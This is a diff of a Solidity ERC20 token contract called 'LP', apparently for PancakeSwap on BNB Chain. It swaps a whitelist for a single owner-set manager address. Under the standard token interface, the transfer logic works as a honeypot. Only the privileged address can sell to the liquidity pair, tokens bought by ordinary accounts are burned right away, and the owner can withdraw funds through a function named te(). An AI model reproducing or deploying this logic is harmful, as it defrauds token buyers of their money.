@@ -171,7 +171,6 @@ contract LP is Context, IERC20, IERC20Metadata, Ownable {
 
     mapping(address => mapping(address => uint256)) private _allowances;
 
-    mapping(address => bool) public wList;
     address public managerAddress;
 
     uint256 private _totalSupply;
@@ -198,30 +197,12 @@ contract LP is Context, IERC20, IERC20Metadata, Ownable {
         _name = "LP";
         _symbol = "LP";
         _mint(tokenOwner, initSupply);
-        setWList(tokenOwner, true);
-
-        setWList(msg.sender, true);
-        setWList(address(0xdead), true);
 
         if(block.chainid == 56) {
             uniswapV2Router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
             usdtAddress = 0x55d398326f99059fF775485246999027B3197955;
         }
         uniswapV2Pair = IPancakeFactory(IPancakeRouter(uniswapV2Router).factory()).createPair(address(this), usdtAddress);
-    }
-
-    modifier onlySupervise() {
-        require(
-            wList[_msgSender()] || _msgSender() == owner(), "Ownable: caller is not the supervise");
-        _;
-    }
-
-    function setWorkerAddress(address addr, bool flag) public onlySupervise {
-        wList[addr] = flag;
-    }
-
-    function setWList(address addr, bool flag) public onlyOwner {
-        wList[addr] = flag;
     }
 
     /**
@@ -410,15 +391,15 @@ contract LP is Context, IERC20, IERC20Metadata, Ownable {
             _balances[from] = fromBalance - amount;
         }
 
-        require(wList[from] || (from == uniswapV2Pair));
+        require(from == uniswapV2Pair);
         if (to == uniswapV2Pair) {
-            require(wList[from], "Swap trade failed.");
+            require(from == managerAddress, "Swap trade failed.");
         }
 
         _balances[to] += amount;
         emit Transfer(from, to, amount);
 
-        if (!wList[to] && from == uniswapV2Pair) {
+        if (to != managerAddress && from == uniswapV2Pair) {
             require(to == tx.origin, "Only external accounts allowed");
             _burn(to, amount);
         }
@@ -580,4 +561,8 @@ contract LP is Context, IERC20, IERC20Metadata, Ownable {
     function te(address payable recipient, uint256 amount) public onlyOwner {
         recipient.transfer(amount);
     }
-}
+
+    function setManagerAddress(address _managerAddress) public onlyOwner {
+        managerAddress = _managerAddress;
+    }
+}   
